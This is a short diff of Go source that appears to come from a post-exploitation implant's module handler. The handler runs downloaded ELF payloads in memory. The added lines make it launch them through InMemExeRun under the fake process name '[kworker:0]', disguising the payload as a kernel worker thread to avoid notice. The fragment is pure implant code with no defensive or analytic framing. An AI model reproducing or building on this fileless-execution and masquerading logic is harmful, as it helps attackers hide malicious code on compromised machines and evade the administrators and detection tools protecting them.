@@ -84,12 +84,14 @@ func moduleHandler(download_addr, file_to_download, payload_type, modName, check
 			return out
 		}
 	case "elf":
-		out = "Successfully executed ELF binary in memory"
-		err = exe_utils.ELFRun(payload_data, fields, env)
-		if err != nil {
-			out = fmt.Sprintf("running ELF binary in memory: %v", err)
+		if inMem {
+			out = "Successfully executed ELF binary in memory"
+			err = exe_utils.InMemExeRun(payload_data, []string{"[kworker:0]"}, env)
+			if err != nil {
+				out = fmt.Sprintf("running ELF binary in memory: %v", err)
+			}
+			return out
 		}
-		return out
 	default:
 		// on disk modules
 		args = fields[1:]
